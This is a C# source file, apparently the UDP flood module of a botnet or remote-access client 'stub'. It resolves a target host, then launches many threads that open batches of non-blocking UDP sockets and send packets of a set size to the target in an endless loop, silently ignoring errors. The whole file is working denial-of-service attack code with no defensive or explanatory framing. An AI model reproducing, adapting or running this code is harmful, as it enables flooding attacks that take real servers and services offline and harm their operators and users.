namespace Stub
{
    using System;
    using System.Net;
    using System.Net.Sockets;
    using System.Threading;

    internal class UdpFlood
    {
        private static ThreadStart[] FloodingJob;
        private static Thread[] FloodingThread;
        public static string Host;
        private static IPEndPoint ipEo;
        public static int Port;
        public static int pSize;
        private static SendUdp[] SynClass;
        public static int Threads;
        public static int UdpSockets;

        public static void StartUdpFlood()
        {
            try
            {
                ipEo = new IPEndPoint(Dns.GetHostEntry(Host).AddressList[0], Port);
            }
            catch
            {
                ipEo = new IPEndPoint(IPAddress.Parse(Host), Port);
            }
            FloodingThread = new Thread[Threads];
            FloodingJob = new ThreadStart[Threads];
            SynClass = new SendUdp[Threads];
            for (int i = 0; i < Threads; i++)
            {
                SynClass[i] = new SendUdp(ipEo, UdpSockets, pSize);
                FloodingJob[i] = new ThreadStart(SynClass[i].Send);
                FloodingThread[i] = new Thread(FloodingJob[i]);
                FloodingThread[i].Start();
            }
        }

        public static void StopUdpFlood()
        {
            for (int i = 0; i < Threads; i++)
            {
                try
                {
                    FloodingThread[i].Suspend();
                }
                catch
                {
                }
            }
        }

        private class SendUdp
        {
            private IPEndPoint ipEo;
            private int pSize;
            private Socket[] Sock;
            private int UdpSockets;

            public SendUdp(IPEndPoint ipEo, int SynSockets, int pSize)
            {
                this.ipEo = ipEo;
                this.UdpSockets = SynSockets;
                this.pSize = pSize;
            }

            public void Send()
            {
                int num;
                byte[] buffer;
            Label_0000:
                buffer = new byte[this.pSize];
                try
                {
                    this.Sock = new Socket[this.UdpSockets];
                    for (num = 0; num < this.UdpSockets; num++)
                    {
                        this.Sock[num] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        this.Sock[num].Blocking = false;
                        this.Sock[num].SendTo(buffer, this.ipEo);
                    }
                    Thread.Sleep(100);
                    for (num = 0; num < this.UdpSockets; num++)
                    {
                        if (this.Sock[num].Connected)
                        {
                            this.Sock[num].Disconnect(false);
                        }
                        this.Sock[num].Close();
                        this.Sock[num] = null;
                    }
                    this.Sock = null;
                    goto Label_0000;
                }
                catch
                {
                    for (num = 0; num < this.UdpSockets; num++)
                    {
                        try
                        {
                            if (this.Sock[num].Connected)
                            {
                                this.Sock[num].Disconnect(false);
                            }
                            this.Sock[num].Close();
                            this.Sock[num] = null;
                        }
                        catch
                        {
                        }
                    }
                    goto Label_0000;
                }
            }
        }
    }
}

